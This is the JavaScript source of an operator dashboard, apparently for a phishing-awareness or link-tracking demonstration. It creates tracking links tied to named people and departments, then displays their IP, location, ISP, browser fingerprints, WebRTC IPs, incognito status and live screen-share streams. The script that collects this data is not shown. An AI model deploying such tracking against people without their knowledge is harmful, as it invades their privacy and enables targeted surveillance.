// ============================================
// ClickProof Dashboard — Firebase Realtime
// Uses: js/firebase.js (window.FirebaseDB)
//       js/webrtc.js  (window.WebRTCManager)
// ============================================

const db = window.FirebaseDB.db;

// ============================================
// 상태
// ============================================
const state = {
    visitors: {},
    tokenNames: {},   // { token: { name, department } }
    tokenHistory: [], // [{ token, name, department, url, createdAt }]
    screenReceivers: {},  // { token: { pc, stop } }
    baseUrl: window.location.origin
};

// ============================================
// DOM 참조
// ============================================
const dom = {
    totalVisitors: document.getElementById('totalVisitors'),
    totalDataPoints: document.getElementById('totalDataPoints'),
    totalScreenShare: document.getElementById('totalScreenShare'),
    cardGrid: document.getElementById('cardGrid'),
    emptyState: document.getElementById('emptyState'),
    targetName: document.getElementById('targetName'),
    targetDept: document.getElementById('targetDept'),
    generateBtn: document.getElementById('generateBtn'),
    genResult: document.getElementById('genResult'),
    generatedUrl: document.getElementById('generatedUrl'),
    copyBtn: document.getElementById('copyBtn'),
    toggleHistoryBtn: document.getElementById('toggleHistoryBtn'),
    tokenHistory: document.getElementById('tokenHistory'),
    historyList: document.getElementById('historyList'),
    clearHistoryBtn: document.getElementById('clearHistoryBtn'),
    screenShareSection: document.getElementById('screenShareSection'),
    screenShareGrid: document.getElementById('screenShareGrid'),
    screenShareCount: document.getElementById('screenShareCount'),
    clientCount: document.getElementById('clientCount')
};

// ============================================
// 유틸리티
// ============================================
function escapeHtml(str) {
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

function formatTime(timestamp) {
    if (!timestamp) return '';
    const d = new Date(timestamp);
    const hh = String(d.getHours()).padStart(2, '0');
    const mm = String(d.getMinutes()).padStart(2, '0');
    const ss = String(d.getSeconds()).padStart(2, '0');
    return hh + ':' + mm + ':' + ss;
}

// ============================================
// 토큰 생성
// ============================================
function generateToken() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let token = '';
    for (let i = 0; i < 6; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

function handleGenerate() {
    const name = dom.targetName.value.trim();
    if (!name) {
        dom.targetName.focus();
        dom.targetName.style.borderColor = '#ff4444';
        setTimeout(() => { dom.targetName.style.borderColor = ''; }, 1500);
        return;
    }

    const department = dom.targetDept.value.trim() || '';
    const token = generateToken();

    const tokenData = { name: name, createdAt: Date.now() };
    if (department) tokenData.department = department;

    db.ref('tokens/' + token).set(tokenData);
    state.tokenNames[token] = { name, department };

    const url = state.baseUrl + '/?t=' + token;
    dom.generatedUrl.textContent = url;
    dom.genResult.classList.add('active');

    state.tokenHistory.unshift({ token, name, department, url, createdAt: Date.now() });
    renderHistory();
    saveHistoryToLocal();

    dom.targetName.value = '';
    dom.targetDept.value = '';
    showToast('TOKEN 생성 완료: ' + name);
}

function handleCopy() {
    const url = dom.generatedUrl.textContent;
    if (!url || url === '—') return;

    navigator.clipboard.writeText(url).then(() => {
        dom.copyBtn.textContent = '✓';
        dom.copyBtn.classList.add('copied');
        setTimeout(() => {
            dom.copyBtn.textContent = '⧉';
            dom.copyBtn.classList.remove('copied');
        }, 2000);
    });
}

// ============================================
// 토큰 히스토리 (localStorage)
// ============================================
function loadHistoryFromLocal() {
    try {
        const saved = localStorage.getItem('clickproof_token_history');
        if (saved) state.tokenHistory = JSON.parse(saved);
    } catch (e) { /* ignore */ }
}

function saveHistoryToLocal() {
    try {
        localStorage.setItem('clickproof_token_history', JSON.stringify(state.tokenHistory.slice(0, 50)));
    } catch (e) { /* ignore */ }
}

function renderHistory() {
    if (state.tokenHistory.length === 0) {
        dom.historyList.innerHTML = '<div class="history-empty">생성된 토큰이 없습니다</div>';
        return;
    }

    dom.historyList.innerHTML = state.tokenHistory.map(entry => {
        const isConnected = !!state.visitors[entry.token];
        const statusClass = isConnected ? 'connected' : 'waiting';
        const statusText = isConnected ? 'CONNECTED' : 'WAITING';
        const deptHtml = entry.department
            ? '<span class="history-dept">' + escapeHtml(entry.department) + '</span>'
            : '';

        return '<div class="history-item">' +
            '<span class="history-name">' + escapeHtml(entry.name) + '</span>' +
            deptHtml +
            '<span class="history-url" data-url="' + escapeHtml(entry.url) + '">' + escapeHtml(entry.url) + '</span>' +
            '<span class="history-status ' + statusClass + '">' + statusText + '</span>' +
            '</div>';
    }).join('');

    dom.historyList.querySelectorAll('.history-url').forEach(el => {
        el.addEventListener('click', () => {
            navigator.clipboard.writeText(el.dataset.url).then(() => showToast('URL 복사됨'));
        });
    });
}

function clearHistory() {
    state.tokenHistory = [];
    saveHistoryToLocal();
    renderHistory();
}

// ============================================
// 데이터 파싱
// ============================================
function countDataPoints(data) {
    if (!data) return 0;
    let count = 0;
    const fields = [
        'ip', 'userAgent', 'language', 'platform', 'screenResolution',
        'timezone', 'connectionType', 'cookiesEnabled', 'doNotTrack',
        'gpu', 'gpuVendor', 'canvasFingerprint', 'webglFingerprint',
        'audioFingerprint', 'fonts', 'plugins', 'battery', 'deviceMemory',
        'hardwareConcurrency', 'touchSupport', 'location', 'city',
        'country', 'isp', 'org', 'latitude', 'longitude',
        'webrtcLocalIPs', 'webrtcPublicIP', 'incognito'
    ];
    fields.forEach(f => {
        if (data[f] !== undefined && data[f] !== null && data[f] !== '') count++;
    });
    if (data.geo) count += Object.keys(data.geo).length;
    if (data.fingerprint) count += Object.keys(data.fingerprint).length;
    return count;
}

function parseOS(ua) {
    if (!ua) return 'Unknown';
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Windows/.test(ua)) return 'Windows';
    if (/Mac OS X/.test(ua)) return 'macOS';
    if (/Android/.test(ua)) return 'Android';
    if (/iPhone|iPad/.test(ua)) return 'iOS';
    if (/Linux/.test(ua)) return 'Linux';
    return 'Unknown';
}

function parseBrowser(ua) {
    if (!ua) return 'Unknown';
    if (/Edg\//.test(ua)) return 'Edge';
    if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) return 'Chrome';
    if (/Firefox\//.test(ua)) return 'Firefox';
    if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return 'Safari';
    if (/OPR\//.test(ua)) return 'Opera';
    return 'Unknown';
}

function parseDevice(ua) {
    if (!ua) return '';
    if (/iPhone/.test(ua)) return 'iPhone';
    if (/iPad/.test(ua)) return 'iPad';
    if (/Macintosh/.test(ua)) return 'Mac';
    if (/Android.*Mobile/.test(ua)) return 'Android Phone';
    if (/Android/.test(ua)) return 'Android Tablet';
    return 'PC';
}

function getLocation(data) {
    if (data.city && data.country) return data.city + ', ' + data.country;
    if (data.geo) {
        if (data.geo.city && data.geo.country) return data.geo.city + ', ' + data.geo.country;
        if (data.geo.country) return data.geo.country;
    }
    if (data.country) return data.country;
    return '수집 중...';
}

function getGPU(data) {
    if (data.gpu) return data.gpu;
    if (data.fingerprint && data.fingerprint.gpu) return data.fingerprint.gpu;
    return '미확인';
}

function maskIP(ip) {
    if (!ip) return '수집 중...';
    const parts = ip.split('.');
    if (parts.length === 4) return parts[0] + '.' + parts[1] + '.***.***';
    if (ip.includes(':')) {
        const seg = ip.split(':');
        if (seg.length > 2) return seg[0] + ':' + seg[1] + ':****:****';
    }
    return ip;
}

function isIncognito(data) {
    if (data.incognito === true) return true;
    if (data.incognito === false) return false;
    return null;
}

function getDisplayName(token, data) {
    if (state.tokenNames[token]) return state.tokenNames[token].name || token;
    if (data && data.name) return data.name;
    return '익명 사용자 #' + token.substring(0, 4).toUpperCase();
}

function getDepartment(token) {
    return (state.tokenNames[token] && state.tokenNames[token].department) || '';
}

function getFingerprintHash(data) {
    if (data.canvasFingerprint) return data.canvasFingerprint.substring(0, 12);
    if (data.webglFingerprint) return data.webglFingerprint.substring(0, 12);
    if (data.fingerprint && data.fingerprint.hash) return data.fingerprint.hash.substring(0, 12);
    return null;
}

// ============================================
// 카드 렌더링
// ============================================
function createCard(token, data) {
    const name = getDisplayName(token, data);
    const department = getDepartment(token);
    const os = parseOS(data.userAgent);
    const browser = parseBrowser(data.userAgent);
    const device = parseDevice(data.userAgent);
    const location = getLocation(data);
    const gpu = getGPU(data);
    const incognito = isIncognito(data);
    const dataPoints = countDataPoints(data);
    const time = formatTime(data.timestamp || data.createdAt);
    const ip = maskIP(data.ip);
    const fpHash = getFingerprintHash(data);
    const screenSharing = !!state.screenReceivers[token];

    const incognitoBadge = incognito === true
        ? '<span class="badge badge-incognito">INCOGNITO</span>' : '';
    const screenBadge = screenSharing
        ? '<span class="badge badge-screen">SCREEN</span>' : '';
    const deptHtml = department
        ? '<div class="card-dept">' + escapeHtml(department) + '</div>' : '';
    const screenThumbHtml = screenSharing
        ? '<div class="card-screen-thumb" id="thumb-' + token + '"><span class="thumb-live">● LIVE</span></div>' : '';
    const deviceRow = device
        ? '<div class="card-row"><span class="card-row-icon">▢</span><span class="card-row-label">DEVICE</span><span class="card-row-value">' + escapeHtml(device) + '</span></div>' : '';
    const ispVal = data.isp || (data.geo && data.geo.isp);
    const ispRow = ispVal
        ? '<div class="card-row"><span class="card-row-icon">⊕</span><span class="card-row-label">ISP</span><span class="card-row-value">' + escapeHtml(ispVal) + '</span></div>' : '';
    const fpBar = fpHash
        ? '<div class="fingerprint-bar"><span>FINGERPRINT</span><span class="fp-hash">' + escapeHtml(fpHash) + '...</span></div>' : '';

    const cardClass = 'visitor-card' + (screenSharing ? ' has-screen-share' : '');

    return '<div class="' + cardClass + '" id="card-' + token + '" data-token="' + token + '">' +
        '<div class="card-header"><div>' +
            '<div class="card-name">' + escapeHtml(name) + '</div>' +
            deptHtml +
            '<div class="card-token">TOKEN: ' + token + '</div>' +
        '</div><div class="card-badge">' +
            '<span class="badge badge-online">ONLINE</span>' +
            incognitoBadge + screenBadge +
        '</div></div>' +
        screenThumbHtml +
        '<div class="card-body">' +
            '<div class="card-row"><span class="card-row-icon">◎</span><span class="card-row-label">LOC</span><span class="card-row-value">' + escapeHtml(location) + '</span></div>' +
            '<div class="card-row"><span class="card-row-icon">◇</span><span class="card-row-label">IP</span><span class="card-row-value masked">' + escapeHtml(ip) + '</span></div>' +
            '<div class="card-row"><span class="card-row-icon">▣</span><span class="card-row-label">OS</span><span class="card-row-value">' + escapeHtml(os) + ' / ' + escapeHtml(browser) + '</span></div>' +
            deviceRow +
            '<div class="card-row"><span class="card-row-icon">◈</span><span class="card-row-label">GPU</span><span class="card-row-value">' + escapeHtml(gpu) + '</span></div>' +
            ispRow +
        '</div>' +
        fpBar +
        '<div class="card-footer"><div class="data-count">' +
            '<span class="data-count-number">' + dataPoints + '</span>' +
            '<span class="data-count-label">DATA<br>COLLECTED</span>' +
        '</div><span class="card-time">' + time + '</span></div>' +
    '</div>';
}

// ============================================
// 통계 업데이트
// ============================================
function updateStats() {
    const visitorCount = Object.keys(state.visitors).length;
    let totalData = 0;
    Object.values(state.visitors).forEach(v => { totalData += countDataPoints(v); });
    const screenShareCount = Object.keys(state.screenReceivers).length;

    animateCounter(dom.totalVisitors, visitorCount);
    animateCounter(dom.totalDataPoints, totalData);
    animateCounter(dom.totalScreenShare, screenShareCount);

    dom.clientCount.textContent = visitorCount + ' clients';
    dom.screenShareCount.textContent = screenShareCount + ' active';

    if (visitorCount > 0) {
        dom.emptyState.classList.add('hidden');
    } else {
        dom.emptyState.classList.remove('hidden');
    }

    if (screenShareCount > 0) {
        dom.screenShareSection.classList.add('active');
    } else {
        dom.screenShareSection.classList.remove('active');
    }

    renderHistory();
}

function animateCounter(el, target) {
    const current = parseInt(el.textContent) || 0;
    if (current === target) return;

    const diff = target - current;
    const step = diff > 0 ? 1 : -1;
    const steps = Math.abs(diff);
    const duration = Math.min(300, steps * 30);
    const interval = duration / steps;

    let count = current;
    const timer = setInterval(() => {
        count += step;
        el.textContent = count;
        if (count === target) clearInterval(timer);
    }, interval);
}

// ============================================
// 화면 공유 수신 (WebRTC)
// ============================================
function watchScreenShare(token) {
    const sigRef = window.FirebaseDB.getSignalingRef(token);

    sigRef.child('offer').on('value', async (snapshot) => {
        const offer = snapshot.val();
        if (!offer || state.screenReceivers[token]) return;

        try {
            const receiver = await window.WebRTCManager.startReceiver(token, (stream) => {
                addScreenShareView(token, stream);
                addScreenThumbToCard(token, stream);
                updateStats();
            });

            state.screenReceivers[token] = receiver;

            receiver.pc.onconnectionstatechange = () => {
                if (['disconnected', 'closed', 'failed'].includes(receiver.pc.connectionState)) {
                    removeScreenShare(token);
                }
            };
        } catch (e) {
            console.error('Screen share receiver error:', token, e);
        }
    });
}

function addScreenShareView(token, stream) {
    const existing = document.getElementById('ss-' + token);
    if (existing) existing.remove();

    const name = getDisplayName(token, state.visitors[token]);

    const box = document.createElement('div');
    box.className = 'screen-share-box';
    box.id = 'ss-' + token;

    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.playsInline = true;
    video.muted = true;

    const label = document.createElement('div');
    label.className = 'screen-share-label';
    label.innerHTML = '<span class="live-dot"></span><span class="label-name">' + escapeHtml(name) + '</span>';

    box.appendChild(video);
    box.appendChild(label);
    dom.screenShareGrid.appendChild(box);
}

function addScreenThumbToCard(token, stream) {
    let thumb = document.getElementById('thumb-' + token);
    if (!thumb) {
        const card = document.getElementById('card-' + token);
        if (card && state.visitors[token]) {
            card.outerHTML = createCard(token, state.visitors[token]);
            thumb = document.getElementById('thumb-' + token);
        }
    }
    if (thumb) {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        video.muted = true;
        thumb.prepend(video);
    }
}

function removeScreenShare(token) {
    if (state.screenReceivers[token]) {
        state.screenReceivers[token].stop();
        delete state.screenReceivers[token];
    }

    const ssView = document.getElementById('ss-' + token);
    if (ssView) ssView.remove();

    const card = document.getElementById('card-' + token);
    if (card && state.visitors[token]) {
        card.outerHTML = createCard(token, state.visitors[token]);
    }

    updateStats();
}

// ============================================
// Firebase 실시간 리스닝
// ============================================
function extractLatestSession(rawData) {
    if (!rawData || typeof rawData !== 'object') return rawData || {};
    if (rawData.userAgent || rawData.ip || rawData.timestamp) return rawData;

    const keys = Object.keys(rawData);
    if (keys.length === 0) return {};

    const numericKeys = keys.filter(k => /^\d+$/.test(k));
    if (numericKeys.length > 0) {
        return rawData[numericKeys.sort().pop()] || {};
    }
    return rawData;
}

function initRealtimeListeners() {
    // 토큰-이름 매핑 로드
    db.ref('tokens').on('value', (snapshot) => {
        const data = snapshot.val();
        if (data) {
            Object.keys(data).forEach(token => {
                state.tokenNames[token] = {
                    name: data[token].name || token,
                    department: data[token].department || ''
                };
            });
            renderAllCards();
        }
    });

    // sessions 경로 감시 (firebase.js pushSessionData와 일치)
    const sessionsRef = db.ref('sessions');

    sessionsRef.on('child_added', (snapshot) => {
        const token = snapshot.key;
        const data = extractLatestSession(snapshot.val());
        state.visitors[token] = data;
        appendCard(token, data);
        updateStats();
        watchScreenShare(token);
        showToast(getDisplayName(token, data) + ' 접속');
    });

    sessionsRef.on('child_changed', (snapshot) => {
        const token = snapshot.key;
        const data = extractLatestSession(snapshot.val());
        state.visitors[token] = data;
        updateCard(token, data);
        updateStats();
    });

    sessionsRef.on('child_removed', (snapshot) => {
        const token = snapshot.key;
        delete state.visitors[token];
        removeScreenShare(token);
        removeCard(token);
        updateStats();
    });

    // visitors 경로 호환성
    const visitorsRef = db.ref('visitors');

    visitorsRef.on('child_added', (snapshot) => {
        const token = snapshot.key;
        if (state.visitors[token]) return;
        const data = snapshot.val();
        state.visitors[token] = data;
        appendCard(token, data);
        updateStats();
        watchScreenShare(token);
        showToast(getDisplayName(token, data) + ' 접속');
    });

    visitorsRef.on('child_changed', (snapshot) => {
        const token = snapshot.key;
        const data = snapshot.val();
        state.visitors[token] = data;
        updateCard(token, data);
        updateStats();
    });

    visitorsRef.on('child_removed', (snapshot) => {
        const token = snapshot.key;
        delete state.visitors[token];
        removeScreenShare(token);
        removeCard(token);
        updateStats();
    });
}

// ============================================
// 카드 CRUD
// ============================================
function appendCard(token, data) {
    const existing = document.getElementById('card-' + token);
    if (existing) {
        existing.outerHTML = createCard(token, data);
        return;
    }
    dom.cardGrid.insertAdjacentHTML('afterbegin', createCard(token, data));
}

function updateCard(token, data) {
    const card = document.getElementById('card-' + token);
    if (card) {
        card.outerHTML = createCard(token, data);
        // 화면 공유 썸네일 복원
        if (state.screenReceivers[token]) {
            const ssView = document.getElementById('ss-' + token);
            const thumb = document.getElementById('thumb-' + token);
            if (ssView && thumb) {
                const srcVideo = ssView.querySelector('video');
                if (srcVideo && srcVideo.srcObject) {
                    const video = document.createElement('video');
                    video.srcObject = srcVideo.srcObject;
                    video.autoplay = true;
                    video.playsInline = true;
                    video.muted = true;
                    thumb.prepend(video);
                }
            }
        }
    } else {
        appendCard(token, data);
    }
}

function removeCard(token) {
    const card = document.getElementById('card-' + token);
    if (card) {
        card.classList.add('removing');
        setTimeout(() => card.remove(), 300);
    }
}

function renderAllCards() {
    dom.cardGrid.innerHTML = '';
    Object.keys(state.visitors).forEach(token => {
        dom.cardGrid.insertAdjacentHTML('beforeend', createCard(token, state.visitors[token]));
    });
    updateStats();
}

// ============================================
// 토스트 알림
// ============================================
function showToast(message) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = '<span class="toast-icon">▸</span>' + escapeHtml(message);
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.classList.add('out');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ============================================
// Firebase 연결 상태 모니터링
// ============================================
function initConnectionMonitor() {
    db.ref('.info/connected').on('value', (snapshot) => {
        const statusEl = document.querySelector('.stat-value.live');
        if (!statusEl) return;
        if (snapshot.val() === true) {
            statusEl.innerHTML = '● LIVE';
        } else {
            statusEl.innerHTML = '○ OFFLINE';
        }
    });
}

// ============================================
// 초기화
// ============================================
dom.generateBtn.addEventListener('click', handleGenerate);
dom.targetName.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleGenerate();
});
dom.targetDept.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleGenerate();
});
dom.copyBtn.addEventListener('click', handleCopy);

dom.toggleHistoryBtn.addEventListener('click', () => {
    dom.tokenHistory.classList.toggle('active');
    dom.toggleHistoryBtn.classList.toggle('active');
});
dom.clearHistoryBtn.addEventListener('click', clearHistory);

loadHistoryFromLocal();
renderHistory();

initRealtimeListeners();
initConnectionMonitor();
